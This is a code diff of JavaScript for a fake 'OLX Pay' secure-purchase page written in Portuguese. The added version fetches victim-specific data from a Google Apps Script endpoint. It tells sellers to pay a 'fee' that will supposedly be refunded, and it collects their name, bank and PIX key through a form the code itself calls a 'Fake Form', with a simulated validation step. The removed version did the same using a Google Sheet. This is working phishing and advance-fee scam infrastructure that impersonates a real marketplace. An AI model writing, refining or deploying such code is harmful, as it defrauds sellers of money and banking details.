@@ -1,7 +1,148 @@
+// ========================================================
+// ⚙️ CONFIGURAÇÃO
+// Coloque aqui a URL do seu Google Apps Script (a mesma usada no Admin)
+const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
+// ========================================================
 
 const mainContainer = document.getElementById('main-container');
 
-// ==== Função para criar elementos ====
+// --- Inicialização Automática ---
+(async function init() {
+  // 1. Captura o ID direto da URL (ex: site.com/?id=pay-123)
+  const params = new URLSearchParams(window.location.search);
+  const id = params.get('id');
+
+  if (!id) {
+    renderError('Link incompleto. Verifique se você copiou o link inteiro enviado pelo vendedor.');
+    return;
+  }
+
+  // 2. Busca os dados no Backend Seguro
+  try {
+    const response = await fetch(`${WEB_APP_URL}?id=${id}`);
+    const json = await response.json();
+
+    if (json.status === 'success') {
+      renderContainer(json.data);
+    } else {
+      renderError(json.message || 'Pedido não encontrado.');
+    }
+  } catch (err) {
+    console.error(err);
+    renderError('Erro de conexão. Verifique sua internet e recarregue a página.');
+  }
+})();
+
+// --- Função de Renderização Principal ---
+function renderContainer(dadosBrutos) {
+  // Normaliza os dados (transforma chaves em minúsculo para evitar erros de digitação na planilha)
+  const dados = {};
+  Object.keys(dadosBrutos).forEach(key => {
+    dados[key.toLowerCase()] = dadosBrutos[key];
+  });
+
+  // Limpa container
+  mainContainer.innerHTML = '';
+
+  // Cria Estrutura
+  const container = criarElemento('div', { class: 'container' });
+  const imgHeader = criarElemento('div', { class: 'header-image' });
+  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
+  const content = criarElemento('div', { class: 'content' });
+
+  // Verifica campos opcionais para evitar "undefined" na tela
+  const taxa = dados.taxa || 'R$ --';
+  const prazo = dados.prazo || '15 minutos';
+  const linkPagamento = dados.linkpagamento || dados['link pagamento'] || '#';
+
+  content.innerHTML = `
+    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
+    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    
+    <h2>Detalhes da transação</h2>
+    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
+    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${dados.valor || '---'}</span></p>
+    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${dados.frete || 'Grátis'}</span></p>
+    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${dados.tarifa || 'Inclusa'}</span></p>
+    ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
+    ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}
+
+    <div style="margin-top:15px">
+      ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
+      ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
+      ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
+    </div>
+
+    <h2>💬 Próximos passos</h2>
+    <ul>
+      <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
+      <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
+    </ul>
+  `;
+
+  // Formulário de Validação (Fake Form)
+  const form = criarElemento('form', { id: 'dadosCliente' });
+  const campos = ['nome', 'banco', 'pix', 'telefone'];
+  
+  campos.forEach(campo => {
+    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
+    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
+    form.append(label, input);
+  });
+
+  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados para Recebimento');
+  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
+  form.append(btnEnviar, msgEnvio);
+  content.appendChild(form);
+
+  // Botão de Pagamento (Oculto inicialmente)
+  const btnPagamento = criarElemento('a', { 
+    id: 'btn-pagamento', 
+    class: 'button hidden', 
+    href: linkPagamento 
+  }, 'Pagar Taxa e Liberar Valor');
+  
+  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
+  content.appendChild(btnContainer);
+
+  // Montagem final
+  container.append(imgHeader, title, content);
+  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
+  container.appendChild(footer);
+  mainContainer.appendChild(container);
+
+  // Lógica do Formulário
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    btnEnviar.textContent = "Validando...";
+    btnEnviar.disabled = true;
+    btnEnviar.style.background = "#555";
+
+    setTimeout(() => {
+      msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
+      msgEnvio.style.color = "#00bfa5"; // Verde
+      msgEnvio.style.fontWeight = "bold";
+
+      // Esconde form e mostra botão
+      form.style.display = 'none'; 
+      btnPagamento.classList.remove('hidden');
+      btnPagamento.classList.add('visible'); // Se tiver CSS de animação
+      btnPagamento.style.display = 'inline-block'; // Garante display
+    }, 1500);
+  });
+}
+
+// --- Função Auxiliar de Erro ---
+function renderError(msg) {
+  mainContainer.innerHTML = `
+    <div class="container" style="text-align:center; padding:40px;">
+      <h2 style="color:#ff4d4d;">Atenção</h2>
+      <p style="color:#ccc;">${msg}</p>
+    </div>`;
+}
+
+// --- Função Auxiliar de Criação de Elementos (Mantida do seu código) ---
 function criarElemento(tag, attrs = {}, inner = '') {
   const el = document.createElement(tag);
   Object.entries(attrs).forEach(([key, value]) => {
@@ -12,159 +153,5 @@ function criarElemento(tag, attrs = {}, inner = '') {
   });
   if (typeof inner === 'string') el.innerHTML = inner;
   else if (inner instanceof Node) el.appendChild(inner);
-  else if (Array.isArray(inner)) inner.forEach(n => el.appendChild(n));
   return el;
 }
-
-function getValue(cell) {
-  if (!cell || cell.v === null || cell.v === undefined) return '---';
-  if (typeof cell.v === 'number') return cell.f || cell.v.toString();
-  return cell.v.toString();
-}
-
-// ==== Tela de autenticação ====
-function renderAuthScreen(dadosPlanilha) {
-  const container = criarElemento('div', { class: 'container' });
-  const imgHeader = criarElemento('div', { class: 'header-image' });
-  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Digite seu ID de acesso' });
-
-  const content = criarElemento('div', { class: 'content' });
-  const input = criarElemento('input', { type: 'text', id: 'inputID', placeholder: 'Ex: pay1024' });
-  const btn = criarElemento('button', { id: 'btnLogin' }, 'Entrar');
-  const msg = criarElemento('p', { id: 'msgLogin' });
-
-  content.append(input, btn, msg);
-  container.append(imgHeader, title, content);
-  mainContainer.appendChild(container);
-
-  btn.addEventListener('click', () => {
-    const valorID = input.value.trim();
-    const dados = dadosPlanilha.find(d => d.id === valorID);
-    if (!dados) {
-      msg.textContent = '❌ ID inválido';
-      msg.style.color = '#ff4d4d';
-      return;
-    }
-    localStorage.setItem('userID', valorID);
-    mainContainer.innerHTML = '';
-    renderContainer(dados);
-  });
-}
-
-// ==== Tela do container ====
-function renderContainer(dados) {
-  const container = criarElemento('div', { class: 'container' });
-  const imgHeader = criarElemento('div', { class: 'header-image' });
-  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
-
-  const content = criarElemento('div', { class: 'content' });
-  content.innerHTML = `
-    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${dados.taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até 15 minutos</span>. Seu seguro está ativo para proteger você contra golpes.</p>
-    <p><strong>Importante:</strong> Você tem até <span class="highlight" id="prazo">${dados.prazo}</span> para concluir o pagamento.</p>
-
-    <h2>Detalhes da transação</h2>
-    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span id="comprador">${dados.comprador}</span></p>
-    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span id="valor">${dados.valor}</span></p>
-    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span id="frete">${dados.frete}</span></p>
-    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span id="tarifa">${dados.tarifa}</span></p>
-    <p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span id="cpf">${dados.cpf}</span></p>
-    <p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação aprovada via:</strong> <span id="cartao">${dados.cartao}</span></p>
-
-    <p>
-      <span class="badge" id="vendas">${dados.vendas}</span>
-      <span class="badge" id="atendimento">${dados.atendimento}</span>
-      <span class="badge" id="entrega">${dados.entrega}</span>
-    </p>
-
-    <h2>💬 Próximos passos</h2>
-    <ul>
-      <li>Preencha o formulário abaixo com seus dados bancários.</li>
-      <li>Após enviar os dados, o botão de pagamento será liberado.</li>
-      <li>Conclua o pagamento para receber o estorno em até 15 minutos.</li>
-    </ul>
-  `;
-
-  const form = criarElemento('form', { id: 'dadosCliente' });
-  const campos = ['nome', 'banco', 'pix', 'telefone', 'endereco'];
-  campos.forEach(campo => {
-    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
-    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
-    form.append(label, input);
-  });
-  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Enviar dados');
-  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
-  form.append(btnEnviar, msgEnvio);
-  content.appendChild(form);
-
-  const btnPagamento = criarElemento('a', { id: 'btn-pagamento', class: 'button hidden', href: dados.linkPagamento }, 'Seguir para o Pagamento');
-  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
-  content.appendChild(btnContainer);
-
-  container.append(imgHeader, title, content);
-  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
-  container.appendChild(footer);
-
-  mainContainer.appendChild(container);
-
-  form.addEventListener('submit', (e) => {
-    e.preventDefault();
-    const dadosCliente = {};
-    campos.forEach(c => dadosCliente[c] = form[c].value.trim());
-    localStorage.setItem('dadosCliente', JSON.stringify(dadosCliente));
-
-    msgEnvio.textContent = "✅ Dados confirmados com sucesso!";
-    msgEnvio.style.color = "#800080";
-
-    form.reset();
-
-    btnPagamento.classList.remove('hidden');
-    btnPagamento.classList.add('visible');
-
-    setTimeout(() => btnPagamento.scrollIntoView({ behavior: 'smooth', block: 'center' }), 600);
-    setTimeout(() => msgEnvio.textContent = '', 3000);
-  });
-}
-
-// ==== Inicialização com fetch da planilha ====
-const SHEET_URL = 'https://docs.google.com/spreadsheets/d/13NPp7cu9-pIcBVTdctBVL81ZuO9ol4654D5ublGOnqg/gviz/tq?tqx=out:json';
-
-fetch(SHEET_URL)
-  .then(res => res.text())
-  .then(text => {
-    const json = JSON.parse(text.substr(47).slice(0, -2));
-    const rows = json.table.rows;
-
-    const dadosPlanilha = rows.map(r => {
-      const c = r.c;
-      return {
-        id: getValue(c[12]),
-        taxa: getValue(c[0]),
-        prazo: getValue(c[1]),
-        comprador: getValue(c[2]),
-        valor: getValue(c[3]),
-        frete: getValue(c[4]),
-        tarifa: getValue(c[5]),
-        cpf: getValue(c[6]),
-        cartao: getValue(c[7]),
-        vendas: getValue(c[8]),
-        atendimento: getValue(c[9]),
-        entrega: getValue(c[10]),
-        linkPagamento: getValue(c[11])
-      };
-    });
-
-    const userID = localStorage.getItem('userID');
-    if (userID) {
-      const dados = dadosPlanilha.find(d => d.id === userID);
-      if (dados) renderContainer(dados);
-      else renderAuthScreen(dadosPlanilha);
-    } else {
-      renderAuthScreen(dadosPlanilha);
-    }
-
-  })
-  .catch(err => {
-    console.error('Erro ao buscar planilha:', err);
-    mainContainer.innerHTML = '<p style="color:#ff4d4d; text-align:center; margin-top:2em;">Erro ao carregar os dados. Tente novamente mais tarde.</p>';
-  });
